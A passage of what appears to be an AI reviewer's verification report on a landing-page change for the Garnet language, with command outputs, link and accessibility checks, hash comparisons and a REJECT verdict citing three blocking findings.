assets/garnet-promo-poster.png	exists	467479
assets/garnet-promo.webm	exists	1103112
service-worker.js	exists	1788

HTTPS hrefs with curl -L:

200 https://garnet-lang.org/
200 https://github.com/Island-Dev-Crew/garnet/commit/fbd64bc514b573a6735b3525f4f3172be14a27d0
200 https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1
200 https://github.com/Island-Dev-Crew/garnet/rules/18936562
200 https://github.com/Island-Dev-Crew/garnet/blob/main/docs/truth.json
200 https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md
200 https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md
200 https://github.com/Island-Dev-Crew/garnet
200 https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST
200 https://islanddevcrew.com/
200 https://github.com/Island-Dev-Crew/garnet/blob/main/LICENSE
200 https://garnet-lang.org/assets/garnet-og.png

Playground:

$ ls -lh docs/playground.html docs/playground/pkg/garnet_wasm_bg.wasm
-rw-r--r--@ 1 IDC2.5 wheel 7.8K docs/playground.html
-rw-r--r--@ 1 IDC2.5 wheel 2.1M docs/playground/pkg/garnet_wasm_bg.wasm

$ grep -nE 'check_source|run_source|diff_caps_source' docs/playground/live.js
2:  check_source,
3:  diff_caps_source,
4:  run_source,
77:  const result = parseAdapterJson(run_source(ui.source.value), RUN_SCHEMA);
93:  const result = parseAdapterJson(check_source(ui.source.value), CHECK_SCHEMA);
106:    diff_caps_source(ui.baseline.value, ui.source.value),

$ grep -nE 'playground/live\.js|id="run-source"|id="check-source"|id="diff-caps"' docs/playground.html
212:    <button id="run-source" class="primary" data-action disabled>Run</button>
213:    <button id="check-source" data-action disabled>Check</button>
214:    <button id="diff-caps" data-action disabled>Diff caps</button>
260:<script type="module" src="playground/live.js"></script>

Shelf:

$ find docs -maxdepth 2 -iname '*shelf*' -print
(no output; exit 0)

Result: PASS — all href targets resolve, Playground is open with check/run/diff-caps, and no Shelf page exists.

ITEM 6 — PRIMITIVES AND RELEASE POSITIONING

$ git show HEAD:docs/truth.json | grep primitive_count
  "primitive_count": 80,

$ grep -n 'research-grade' CLAUDE.md
32:  `garnet-0.5.0-*` build. Still research-grade, not production/1.0.
35:- Garnet is a **research-grade prototype (v0.x.x), not production / 1.0.**

$ git tag --sort=-v:refname | head -1
v0.8.1

Result: PASS — 80 registered primitives and research-grade v0.8.1.

ITEM 7 — STATIC / EXTERNAL-REQUEST AUDIT

$ grep -nE 'https?://' docs/index.html
12:<link rel="canonical" href="https://garnet-lang.org/">
17:<meta property="og:url" content="https://garnet-lang.org/">
19:<meta property="og:image" content="https://garnet-lang.org/assets/garnet-og.png">
26:<meta name="twitter:image" content="https://garnet-lang.org/assets/garnet-og.png">
135:    <span><span class="k">main</span> <a href="https://github.com/Island-Dev-Crew/garnet/commit/fbd64bc514b573a6735b3525f4f3172be14a27d0"><b>fbd64bc5</b></a></span>
136:    <span><span class="k">release</span> <a href="https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1"><b>v<!-- truth:version -->0.8.1<!-- /truth --></b></a> <span class="k">signed · SBOM</span></span>
137:    <span><span class="k">ruleset 18936562</span> <a href="https://github.com/Island-Dev-Crew/garnet/rules/18936562"><b class="ok">bypass_actors []</b></a></span>
139:    <span><span class="k">workspace tests</span> <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/docs/truth.json"><b><!-- truth:workspace_test_count -->2103<!-- /truth --></b></a> <span class="k">measured</span></span>
140:    <span><span class="k">WV-6</span> <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md"><b class="warn">partial</b></a> <span class="k">disclosed, U-58</span></span>
167:    <a class="door" href="https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md">Security<small>policy · disclosure</small></a>
171:    <a class="door" href="https://github.com/Island-Dev-Crew/garnet">GitHub<small>the record itself</small></a>
198:{"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b…bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1",…
213:    <p>Trust-kernel changes carry all five. The register of what the gates caught is public: <a href="https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST">findings U-04 through U-83</a>, historical gaps recorded.</p>
229:    <a class="builtby" href="https://islanddevcrew.com" aria-label="Built by Island Dev Crew">
245:    <span class="foot-meta">© 2026 Island Dev Crew · <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/LICENSE">Apache-2.0 or MIT</a> · <a href="logo-policy.html">name &amp; logo policy</a></span>

Externally loaded absolute URLs: none.

There is no external stylesheet, font, script, image, or iframe. Canonical, Open Graph, and Twitter metadata are declarations; ordinary anchors are navigation links.

Same-origin dependencies are manifest.webmanifest, icons/garnet-192.png, assets/garnet-promo-poster.png, the selected WebM/MP4 video source, playground/live.js on the Playground page, and service-worker.js. The service worker’s install list is entirely same-origin.

Result: PASS under the page’s intended “zero cross-origin external requests” meaning.

ITEM 8 — RETIRED VOCABULARY AND PRESENT-TENSE CLAIMS

$ grep -inE '[retired word elided by the transporting seat]' docs/index.html
(no output; exit 1)

Result: retired vocabulary absent.

Present-tense capability/factual assertions:

1. fbd64bc5 is on origin/main — EXISTS as an ancestor.
2. v0.8.1 has signed-checksum and CycloneDX asset surfaces — EXISTS.
3. Ruleset 18936562 is active with bypass_actors [] and 31 contexts — EXISTS.
4. Workspace tests 2103 — EXISTS; truth stamping passes.
5. WV-6 partial, U-58 disclosed — EXISTS.
6. Jon Isaac is the one human merge gate — EXISTS in CODEOWNERS/governance.
7. The checker rejects an undeclared call into its registered capability surface — EXISTS; diagnostic reproduced, exit 1.
8. Diffs report widened declared authority — EXISTS; authority-expanded reproduced, exit 1.
9. Deterministic builds emit recomputable source_hash and ast_hash — EXISTS.
10. Seals emit the quoted in-toto predicate and disclose missing cosign as UNSIGNED — EXISTS.
11. The positioning is “the integration, not the parts,” with well-precedented pillars and an agent-authored-code target — EXISTS within GARNET_POSITIONING.md’s boundary; positioning gate passes.
12. Research-grade v0.8.1 — EXISTS.
13. Packages or source on Rust 1.95+ — EXISTS; release assets and MSRV gate pass.
14. Playground runs/checks/diffs in-browser — EXISTS in local WASM and live.js.
15. Status truth is sourced — EXISTS through truth markers and truth --check.
16. Governance and security surfaces exist — EXISTS; links resolve.
17. 80 registered primitives — EXISTS in docs/truth.json.
18. Shelf is unavailable until evidence exists — correctly represented as locked; no Shelf page exists.
19. Acceptance is implementation → independent review → structured record → approval → merge, with content movement voiding review — supported by the current contract wording.
20. Register runs U-04 through U-83 with historical gaps — supported by the register’s initial U-04…U-76 sweep plus subsequent U-77…U-83 allocations.
21. Promo is public-site embedded and human/aesthetic acceptance remains open — reporter says so, but the candidate-byte manifest binding does not confirm; see item 9c and blocking finding 3.
22. Static with zero external requests — supported under the cross-origin meaning.
23. The capture is unedited except for marked JSON elisions — NOT confirmed because the checker emits two unmarked cache-note lines.

ITEM 8b — ACCEPTANCE LIST AND REGISTER

$ sed -n '204,214p' docs/index.html
  <section class="accept" aria-labelledby="accept-h">
    <h2 id="accept-h">How a change is accepted here</h2>
    <ol>
      <li><span><b>Implementation</b> on a branch, one slice, evidence-backed.</span></li>
      <li><span><b>Independent review</b> by a different model family from the implementer — never the seat that wrote the work.</span></li>
      <li><span><b>A structured record</b> committed beside the change, bound to the exact reviewed commit.</span></li>
      <li><span><b>Carrier approval</b> bound to the record's commit, then the merge — separate acts, one human gate.</span></li>
      <li><span><b>The rule:</b> a content change voids the verdict; a missing record stays red.</span></li>
    </ol>
    <p>Trust-kernel changes carry all five. The register of what the gates caught is public: <a href="https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST">findings U-04 through U-83</a>, historical gaps recorded.</p>
  </section>

Item 4 does not name post-approval re-evaluation as an operative act. PASS.

$ grep -n 'U-04' F_Project_Management/W_TRUST/*REGISTER*
F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md:31:  U-04, U-07, U-08, U-12, U-15 through U-27 contiguously, U-29 through
F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md:464:- Out of scope, observed: several pre-arc ids (e.g. U-04, U-07, U-08, U-12)
F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:28:- result: the distinct id space runs U-04 through U-76 with the historical
F_Project_Management/W_TRUST/LANDING_ARC_REGISTER_SWEEP_2026-08-31.md:22:- result: the distinct id space runs U-04 through U-72 with the historical

$ grep -nE 'U-(77|78|79|80|81|82|83)\b' F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md | head -8
29:  gaps; no occurrence at or above U-77 exists in any swept tree. **U-77 is
36:| U-77 | WV acceptance evidence is manifest-trust, not re-execution | L6 adversarial packet; #537 review | gate-hardening (contract act) | open |
37:| U-78 | Unmapped Tier-1 seat identities cannot satisfy the v2 record's author binding | #534 record act | L2 fleet (identity rollout) | open |
38:| U-79 | Canonical-JSON record contract has no dedicated local check mode | #534 record act | L4 | open |
39:| U-80 | Parallel seats share one `gh` auth state per machine | #538 / #539 record acts | L2 fleet (credential isolation) | open |
40:| U-81 | R2 eligibility-artifact channel is not producer-authenticated | #538 cross-family review | L1 acts 2 and 4 | open |
41:| U-82 | Base-controlled composite green is unobservable pre-merge by construction | #534 / #536 / #538 firings | L9 evidence ruling (contract act) | open |
42:| U-83 | Four memory natives are caps-invisible | enforcement scope; L6 packet; #537 review; #539 | L8 product (stdlib rows) | open |

Result: PASS — rendered sentence is “findings U-04 through U-83, historical gaps recorded.”

ITEM 9 — ACCESSIBILITY AND RESPONSIVENESS

$ grep -nE 'aria-label="Everything on this site"|aria-disabled="true"|tabindex=|focus-visible|prefers-reduced-motion|overflow-x:auto' docs/index.html
36:@media(prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}
53:.strip a:hover,.strip a:focus-visible{border-bottom-color:var(--gold-soft);outline:none}
74:.door:hover,.door:focus-visible{border-color:var(--ruby);background:var(--panel2);outline:none}
75:.door:focus-visible{box-shadow:0 0 0 2px rgba(214,69,80,.45)}
91:.term pre{margin:0;padding:20px 22px;font:400 12.5px/1.75 var(--mono);color:#bfbcc9;overflow-x:auto;white-space:pre}
124:@media(prefers-reduced-motion:no-preference){
159:  <nav class="doors wrap" aria-label="Everything on this site">
172:    <span class="door locked" role="link" aria-disabled="true" tabindex="0"

At 320 px, the 20 px page padding leaves 280 px. Under the 560 px media rule, each door’s minimum is calc(50% - 9px), so two doors plus the 9 px gap fit. The 1920 px video attribute is constrained by width:100%; the decorative rule uses width:min(420px,70%); terminal overflow is local to pre.

Result: PASS.

ITEM 9b — v3 CURES

9b(i). Meta qualifier

docs/index.html:7:
<meta name="description" content="English is how you tell an agent what to do. Garnet lang is how anyone else can trust what it did. A capability-bounded language whose checker rejects an undeclared call into its registered capability surface, and whose builds and seals a stranger can recompute. By Island Dev Crew.">

Result: PASS.

9b(ii). MSRV

$ PYTHONDONTWRITEBYTECODE=1 python3 -I scripts/garnet_msrv_status.py --gate
{
  "active_manifest_count": 18,
  "active_manifest_set_exact": true,
  "current_surfaces_aligned": true,
  "exact_msrv_ci_check": true,
  "excluded_manifests_declaring": 2,
  "findings": [],
  "msrv": "1.95",
  "ok": true,
  "procedural_contract_present": true,
  "reporter_ci_wired": true,
  "rust_toolchain_file_absent": true,
  "schema": "garnet.msrv_status/v2",
  "stable_tracking_preserved": true,
  "studio_exact_msrv_ci_check": true,
  "workflow_projection_valid": true,
  "workspace_member_count": 16,
  "workspace_members_inheriting": 16
}

Result: PASS.

9b(iii). Truth markers

$ grep -nE '<!-- truth:(version|primitive_count|workspace_test_count) -->' docs/index.html
136:    <span><span class="k">release</span> <a href="https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1"><b>v<!-- truth:version -->0.8.1<!-- /truth --></b></a> <span class="k">signed · SBOM</span></span>
139:    <span><span class="k">workspace tests</span> <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/docs/truth.json"><b><!-- truth:workspace_test_count -->2103<!-- /truth --></b></a> <span class="k">measured</span></span>
155:    <p class="gov">no authority without evidence · research-grade v<!-- truth:version -->0.8.1<!-- /truth --> · built by <b>Island Dev Crew</b></p>
168:    <a class="door" href="stdlib.html">Stdlib<small><!-- truth:primitive_count -->80<!-- /truth --> registered primitives</small></a>

$ PATH=/Users/IDC2.5/.rustup/toolchains/1.95.0-aarch64-apple-darwin/bin:$PATH cargo run -q -p xtask -- truth --check --skip-tests
truth --check: ok (6 fields vs machine truth, 4 stamped surfaces)

Result: PASS.

9b(iv). Elision chunks

diff: exit=1 chunks=2 positions=[0, 317] in_order=True spaces_around_elision=False
seal: exit=0 chunks=2 positions=[0, 146] in_order=True spaces_around_elision=False

Result: PASS for the literal chunks surrounding “…”.

9b(v). Faint contrast and smooth scrolling

$ grep -nE -- '--faint|scroll-behavior' docs/index.html
31:--jade:#2E7D5B;--jade-soft:#5fc79a;--steel:#7C8B9A;--steel-soft:#a9b6c6;--ink:#E9E7E4;--dim:#9a97a3;--faint:#8a8794;
36:@media(prefers-reduced-motion:no-preference){html{scroll-behavior:smooth}}

Recomputed WCAG ratios:
#8a8794 on #0a0a0f: 5.618654:1
#8a8794 on #12121a: 5.299936:1
#8a8794 on #161620: 5.107025:1

Result: PASS.

ITEM 9c — v4 ADDITIONS

9c(i). Positioning

$ PYTHONDONTWRITEBYTECODE=1 python3 scripts/garnet_positioning_status.py --gate
{
  "schema": "garnet.positioning_status/v1",
  "positioning_doc_present": true,
  "landing_present": true,
  "doc_missing_themes": [],
  "landing_missing_themes": [],
  "ok": true,
  "notes": []
}

$ nl -ba F_Project_Management/GARNET_POSITIONING.md | sed -n '17,31p'
17	The individual pillars are **well-precedented**, and the prior art is often
18	stronger — say so:
...
26	**The genuine novelty is the *combination* — capability annotations + bounded
27	execution + sealed provenance + capability diffing — for code agents write.** No
28	existing language combines all of these for that workflow.
...
30	In one line: **Garnet's bet is the integration, not the parts** — the combination
31	targeted at agent-authored code.

Result: PASS. The landing wording carries all three required phrases without exceeding the positioning document.

9c(ii). Promo reporter and assets

$ python3 scripts/garnet_promo_video_status.py --format json
Relevant verbatim fields:
  "status": "public-site-embedded",
  "completion_percent": 95.0,
  "target_duration_seconds": 30,
  "rendered_video_present": true,
  "visual_qa_present": true,
  "website_export_present": true,
  "public_site_embed_present": true,
  "composition_source_present": true,
  "visual_identity_locked": true,
  "source_surfaces_locked": true,
...
  "open_gates": [
    "human/aesthetic acceptance"
  ],

$ ls -l docs/assets/garnet-promo-poster.png docs/assets/garnet-promo.webm docs/assets/garnet-promo.mp4
-rw-r--r--@ 1 IDC2.5 wheel  467479 docs/assets/garnet-promo-poster.png
-rw-r--r--@ 1 IDC2.5 wheel  450674 docs/assets/garnet-promo.mp4
-rw-r--r--@ 1 IDC2.5 wheel 1103112 docs/assets/garnet-promo.webm

The section has id="promo", class="promo-video", poster, WebM, MP4, and all four required caption tokens. Both embedded videos are exactly 30.000000 seconds.

The four current Desktop evidence manifests verify:

render: OK entries=5; non-OK entries=0
visual QA: OK entries=5; non-OK entries=0
website export: OK entries=6; non-OK entries=0
site sync: OK entries=2; non-OK entries=0

However, their media bytes do not bind the candidate:

Candidate:
ab5cf1050ecd94e61a56459f7cae0fb0295219b98e6077a43ac81d22da132c0f  docs/assets/garnet-promo.mp4
62b19c65581d03ccf53b0260392cd48ac17b537c122365dc8411d93a5d94e046  docs/assets/garnet-promo.webm
ee4f73f0614d572568b3e57f55c2e56301aab52916cfdee3086350d5ba29561f  docs/assets/garnet-promo-poster.png

Manifest-backed website export:
703c2bf6715942ca500f7716fe7d5d24f1e13d6f5746faa91c12b8ed56b5b9e7  garnet-promo.mp4
9a96488c3e5c78a21ece9abd05dc280e821f493279867053cf39a2c60dcf3da2  garnet-promo.webm
d9ccd2e55865528ea3349c88bf6fe7745c742a68efbc6429282e43e9559fdd72  garnet-promo-poster.png

Candidate videos:
duration=30.000000
size=450674
duration=30.000000
size=1103112

Evidence videos:
duration=60.000000
size=3173744
duration=60.000000
size=5664645

$ find /Users/IDC2.5/Desktop/dogfood -name MANIFEST.sha256 -type f -print0 | xargs -0 rg -l 'ab5cf105...|62b19c65...|ee4f73f0...'
(no output; exit 1)

The reporter accepts the candidate files by existence/nonzero-size and page-token checks; it does not compare their hashes against the site-sync evidence. Therefore source_surfaces_locked and public_site_embed_present are true under the reporter’s current predicate, but the caption’s candidate-specific “manifest-backed evidence” cannot be confirmed. Human/aesthetic acceptance remaining open and incomplete MIT/productization status are confirmed.

9c(iii). Branch topology

$ git log --oneline f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
427d51a site(front-door): carry the positioning themes and the promo embed the gates require
0d45e43 records(front-door): Codex confirmation record, three lineages (CONFIRM bound to 36040564; rebased content byte-identical)
29651b6 site(front-door): replace the June index with the evidence front door

Result: PASS — content, record, content.

ITEM 10 — ROLLING TRUST GATE

The reporter was wrapped in a 300-second wall-clock alarm.

$ python3 -I scripts/garnet_trust_kernel_review_status.py --base f77a3ebd6d5890d0d46eb71633446b7275995956 --head HEAD --format json
{
  "schema": "garnet.trust_kernel_review/v2",
  "ok": true,
  "discovery_ok": true,
  "discovery_source": "git",
  "base_commit": "f77a3ebd6d5890d0d46eb71633446b7275995956",
  "head_commit": "427d51aff4b2bf7f0d5092cbb3739bc2442e0a73",
  "trust_kernel_touched": false,
  "touched_paths": [],
  "review_record_present": false,
  "review_record_path": null,
  "reviewer": null,
  "reviewer_id": null,
  "reviewer_login": null,
  "reviewed_head": null,
  "reviewed_tree": null,
  "content_digest": null,
  "changed_count": 3,
  "problems": [],
  "review_companion_present": false,
  "companion_paths": [],
  "review_trailer_present": false,
  "trust_kernel_prefixes": [
    "garnet-check-v0.3/src/",
    "garnet-interp-v0.3/src/",
    "garnet-vm/src/",
    "garnet-stdlib/src/",
    "garnet-wasm/src/",
    ".github/actions/",
    ".github/rulesets/",
    ".github/workflows/",
    "scripts/garnet_",
    "scripts/test_garnet_",
    "F_Project_Management/W_TRUST/landed/"
  ],
  "trust_kernel_files": [
    ".github/CODEOWNERS",
    "Cargo.lock",
    "garnet-cli/Cargo.toml",
    "garnet-cli/src/bound_source.rs",
    "garnet-cli/src/cmd/add.rs",
    "garnet-cli/src/cmd/mod.rs",
    "garnet-cli/src/cmd/run.rs",
    "garnet-cli/src/cmd/test.rs",
    "garnet-cli/src/cmd/eval.rs",
    "garnet-cli/src/cmd/doctest.rs",
    "garnet-cli/src/bin/garnet.rs",
    "garnet-cli/src/lib.rs",
    "scripts/garnet_launch_readiness_status.py",
    "scripts/garnet_caps_enforcement_status.py",
    "scripts/garnet_capability_scope_status.py",
    "scripts/garnet_bounded_enforcement_status.py",
    "scripts/garnet_red_team_status.py",
    "docs/why.html",
    "C_Language_Specification/GARNET_CAPABILITY_ENFORCEMENT_SCOPE.md",
    "F_Project_Management/W_TRUST/LANDED_REVIEW_MARKERS.json"
  ]
}

Result: PASS — ok true, touched_paths [], exact head bound. The reporter independently reports changed_count 3 for the stated base-to-head range.

VOID-ON-MOVE: this verdict binds 427d51aff4b2bf7f0d5092cbb3739bc2442e0a73 and is void the instant HEAD moves.

VERDICT: REJECT — bound to 427d51aff4b2bf7f0d5092cbb3739bc2442e0a73

1. BLOCKING — The required scope recomputation fails. `git diff --stat fbd64bc5..HEAD` contains seven files, not two. Even the stated base-to-head range contains three files, confirmed independently by the rolling reporter’s `changed_count: 3`. The asserted “nothing else” scope is therefore not true for either named range.

2. BLOCKING — The capture block is not verbatim against the requested current execution. The checker prepends two episodic-cache note lines that are absent from the page, while the page says only long JSON lines were elided with “…”. The core diagnostic and every marked JSON chunk match, but the unmarked extra lines violate the explicit transcript requirement.

3. BLOCKING — The exact embedded promo bytes are not bound by the manifest-backed evidence currently selected by `garnet_promo_video_status.py`. All four evidence manifests verify, but they bind different 60-second files; the candidate embeds different 30-second hashes, and no current Desktop dogfood manifest contains those hashes. The reporter reaches `public_site_embed_present: true` through existence and token checks without hash equality, so the caption’s candidate-specific manifest-backed claim is unsupported at this SHA.



```
